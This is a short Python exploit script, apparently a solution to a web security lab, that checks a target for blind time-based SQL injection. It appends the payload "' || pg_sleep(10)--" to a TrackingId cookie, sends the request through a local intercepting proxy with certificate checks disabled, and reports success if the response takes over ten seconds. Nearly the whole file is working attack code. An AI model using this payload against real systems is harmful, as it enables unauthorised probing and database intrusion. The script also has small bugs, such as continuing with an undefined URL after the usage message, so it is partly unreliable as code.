import sys
import urllib
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080'}


def exploit_payload(url):
    payload = "' || pg_sleep(10)--"
    encoded_payload = urllib.parse.quote_plus(payload)
    cookies = {'TrackingId': 'xuJIwCxnkP3mLkUM' + encoded_payload,
               'sessionId': 'pGq8hOuUl6x0PEIDZ2C03LWuyQtvHGrA'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds()) > 10:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print(f'[*] Usage: python {sys.argv[0]} <url>')
        print(f'[*] Example: python {sys.argv[0]} http://www.example.com')
    print("\n[+] Checking if the target is vulnerable...")
    if exploit_payload(url):
        print(f'\n[+] Exploit Successful!')
    else:
        print('\n[-] Exploit Failed!')
